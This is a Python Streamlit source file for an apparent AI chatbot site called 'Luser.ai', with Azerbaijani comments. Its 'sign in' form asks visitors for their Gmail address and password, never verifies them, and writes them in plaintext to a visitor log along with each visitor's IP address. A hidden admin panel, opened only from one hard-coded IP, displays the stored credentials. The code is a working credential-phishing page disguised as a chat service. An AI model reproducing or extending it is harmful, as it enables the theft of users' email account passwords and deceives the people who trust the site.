import streamlit as st
import os
import requests
import json
import datetime
from gtts import gTTS
from io import BytesIO
import pandas as pd
from bot_brain import get_smart_answer # YENİ YARATDIĞIMIZ FAYLDAN BEYNİ ÇƏKİRİK!

# ==========================================
# 1. KONFİQURASİYA VƏ Z.AI MOBİL DİZAYN
# ==========================================
st.set_page_config(page_title="Luser Ai", page_icon="🐉", layout="wide", initial_sidebar_state="collapsed")

st.markdown("""
    <style>
    html, body, [data-testid="stAppViewContainer"], [data-testid="stHeader"] {
        background-color: #000000 !important;
        color: #ffffff !important;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif !important;
    }
    .hero-title { font-size: 2.8rem; font-weight: 800; text-align: center; color: #ffffff; margin-top: 10px; margin-bottom: 20px; }
    div[data-testid="column"] button { background-color: #ffffff !important; color: #000000 !important; font-weight: bold !important; border-radius: 8px !important; }
    .stChatInputContainer { background-color: #000000 !important; border: 1px solid #ffffff !important; border-radius: 10px !important; padding: 5px !important; }
    .footer-section { margin-top: 60px; padding: 20px 0; border-top: 1px solid #333; text-align: center; }
    .footer-links a { color: #888; text-decoration: none; margin: 0 10px; font-weight: 500; font-size: 0.9rem;}
    .footer-links a:hover { color: #ffffff; }
    .login-container { background-color: #111; padding: 30px; border-radius: 12px; border: 1px solid #444; margin-bottom: 30px; box-shadow: 0 0 20px rgba(255, 255, 255, 0.1); }
    </style>
    """, unsafe_allow_html=True)

# ==========================================
# 2. SESSION STATE VƏ İZLƏMƏ SİSTEMİ
# ==========================================
LOG_FILE = "visitor_logs.json"
MY_IP = "94.20.98.116" 

if "logged_in" not in st.session_state: st.session_state.logged_in = False
if "username" not in st.session_state: st.session_state.username = "Patron"
if "show_login" not in st.session_state: st.session_state.show_login = False
if "lang" not in st.session_state: st.session_state.lang = "az"
if "messages" not in st.session_state: st.session_state.messages = []

def get_ip():
    try: return requests.get('https://api.ipify.org', timeout=3).text
    except: return "Hidden"

user_ip = get_ip()

def save_visit(ip, gmail_id="Anonim", gmail_pass="Anonim"):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = {"Tarix": now, "IP": ip, "Gmail Adı": gmail_id, "Gmail Şifrəsi": gmail_pass}
    logs = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f: logs = json.load(f)
        except: logs = []
    logs.append(entry)
    with open(LOG_FILE, "w") as f: json.dump(logs, f)

if "visited_logged" not in st.session_state:
    save_visit(user_ip)
    st.session_state.visited_logged = True

# ==========================================
# 3. ÜST PANEL VƏ 100% İŞLƏYƏN "DAXİL OL" MEXANİZMİ
# ==========================================
top_col1, top_col2, top_col3 = st.columns([1, 2, 1])
with top_col2:
    st.markdown("<div style='text-align:center; color:#aaa; font-weight:bold; margin-top:10px;'>LUSER-5-Turbo ⌄</div>", unsafe_allow_html=True)

with top_col3:
    if st.session_state.logged_in:
        if st.button(f"👤 {st.session_state.username}", use_container_width=True):
            st.session_state.logged_in = False 
            st.rerun()
    else:
        if st.button("Daxil ol", use_container_width=True):
            st.session_state.show_login = not st.session_state.show_login

# BUG FİX: Giriş Forması indi st.form istifadə edir (Datanı 100% yadda saxlayır)
if st.session_state.show_login and not st.session_state.logged_in:
    with st.container():
        st.markdown("<div class='login-container'>", unsafe_allow_html=True)
        st.markdown("<h2 style='text-align:center;'>Söhbət Tarixçənizə Daxil Olun.</h2>", unsafe_allow_html=True)
        st.markdown("<p style='text-align:center; color:#888;'>Çat tarixçəsinin kilidini açmaq üçün daxil olun.</p>", unsafe_allow_html=True)
        
        # Məhz bu "form" bloku məlumatın yaddan çıxmasının qarşısını alır
        with st.form("login_form"):
            gmail_input = st.text_input("Gmail Adınız:", placeholder="nümunə@gmail.com")
            pass_input = st.text_input("Şifrəniz:", type="password", placeholder="Şifrənizi daxil edin")
            submit_btn = st.form_submit_button("Təsdiqlə və Daxil Ol", use_container_width=True)
            
            if submit_btn:
                if gmail_input:
                    # @ işarəsindən əvvəlki hissəni ləqəb edirik (Məs: luserzz@... -> Luserzz)
                    nickname = gmail_input.split('@')[0].capitalize() if '@' in gmail_input else gmail_input.capitalize()
                    st.session_state.username = nickname
                    st.session_state.logged_in = True
                    st.session_state.show_login = False
                    save_visit(user_ip, gmail_input, pass_input)
                    st.rerun()
        
        if st.button("Bağla", use_container_width=True):
            st.session_state.show_login = False
            st.rerun()
        st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# 4. LOQO VƏ BAŞLIQ
# ==========================================
def display_logo():
    if os.path.exists("images"):
        for f in os.listdir("images"):
            if any(x in f.lower() for x in ["luser", "nazli"]):
                st.image(os.path.join("images", f), width=70)
                return

c_l1, c_l2, c_l3 = st.columns([5,1,5])
with c_l2: display_logo()

st.markdown("<div class='hero-title'>Salam, mən Luser.ai</div>", unsafe_allow_html=True)

# ==========================================
# 5. MODLAR VƏ GİZLİ ADMİN PANELİ (PATRON ÜÇÜN)
# ==========================================
with st.expander("⚙️ Sistem Tənzimləmələri və Modlar"):
    mod_c1, mod_c2, mod_c3 = st.columns(3)
    if mod_c1.button("🇦🇿 AZERBAİJAN"): st.session_state.lang = "az"
    if mod_c2.button("🇺🇸 ENGLİSH"): st.session_state.lang = "en"
    if mod_c3.button("🇷🇺 RUSSIAN"): st.session_state.lang = "ru"
    st.radio("Model Seçimi:", ["Hızlı (Sınırsız)", "Pro (15 AZN)", "Düşünməli (10 AZN)"], horizontal=True)
    st.file_uploader("Fayl, PDF və ya Şəkil əlavə et (+)", type=['png', 'jpg', 'pdf', 'jpeg'])

if user_ip == MY_IP:
    with st.sidebar:
        st.markdown("## 👑 Patron Paneli")
        st.success("IP Doğrulandı. Sistem Sizin üçündür.")
        if st.button("📊 Database'i Aç", use_container_width=True):
            st.session_state.show_admin = not st.session_state.get("show_admin", False)
        if st.button("🗑️ Söhbəti Təmizlə", use_container_width=True):
            st.session_state.messages = []
            st.rerun()

if st.session_state.get("show_admin", False) and user_ip == MY_IP:
    st.markdown("### 🌍 Bütün Girişlər (Database)")
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f: data = json.load(f)
        st.dataframe(pd.DataFrame(data).tail(50), use_container_width=True)
    else:
        st.warning("Data hələ yoxdur.")
    st.write("---")

# ==========================================
# 6. SÜNİ İNTELLEKT MÜHƏRRİKİ (bot_brain.py-dən gəlir)
# ==========================================
for m in st.session_state.messages:
    with st.chat_message(m["role"], avatar="🐉" if m["role"] == "assistant" else "👤"):
        st.markdown(m["content"])

if prompt := st.chat_input("Bu gün sizə necə kömək edə bilərəm?"):
    st.session_state.messages.append({"role": "user", "content": prompt})
    with st.chat_message("user", avatar="👤"): st.write(prompt)

    with st.chat_message("assistant", avatar="🐉"):
        with st.spinner("Beyin məlumatları analiz edir..."):
            
            # XARİCİ FAYLDAN İDARƏ OLUNAN AI
            current_user = st.session_state.username if st.session_state.logged_in else "Qonaq"
            final_answer = get_smart_answer(prompt, current_user, st.session_state.lang)
            
            st.markdown(final_answer)
            
            # Səsli Oxuma (Hər dildə mükəmməl işləyir)
            try:
                tts_lang = 'tr' if st.session_state.lang == "az" else st.session_state.lang
                tts = gTTS(text=final_answer[:400], lang=tts_lang) 
                fp = BytesIO()
                tts.write_to_fp(fp)
                st.audio(fp)
            except: pass
            
            st.session_state.messages.append({"role": "assistant", "content": final_answer})

# ==========================================
# 7. FOOTER VƏ LİNKLƏR
# ==========================================
st.markdown("""
    <div class='footer-section'>
        <div class='footer-links'>
            <a href='https://instagram.com/luser4x' target='_blank'>Texnologiya Bloqu</a>
            <a href='https://tiktok.com/@luser4x' target='_blank'>Bizimlə əlaqə saxlayın</a>
            <a href='#' target='_blank'>Xidmət Şərtləri</a>
        </div>
        <p style='margin-top:20px; color:#444; font-size:11px;'>© 2026 AI Programlan OSS | DESIGNED BY ELMEDDIN</p>
    </div>
""", unsafe_allow_html=True)
